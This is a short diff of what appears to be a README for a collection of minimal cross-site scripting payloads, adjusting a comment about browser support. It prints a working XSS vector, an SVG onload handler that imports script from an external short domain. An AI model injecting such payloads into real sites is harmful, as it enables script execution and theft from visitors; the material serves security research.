@@ -86,10 +86,7 @@ The DEMO available here: <https://tinyxss.terjanq.me>
 ```
 
 ```html
-<!-- Uses external script as import, doesn't work in innerHTML unless Firefox -->
-```
-
-```html
+<!-- Uses external script as import, doesn't work in innerHTML -->
 <!-- The PoC only works on https and Chrome, because Ǌ.₨ checks for Sec-Fetch-Dest header -->
 <svg/onload=import(/\\Ǌ.₨/)>
 ```
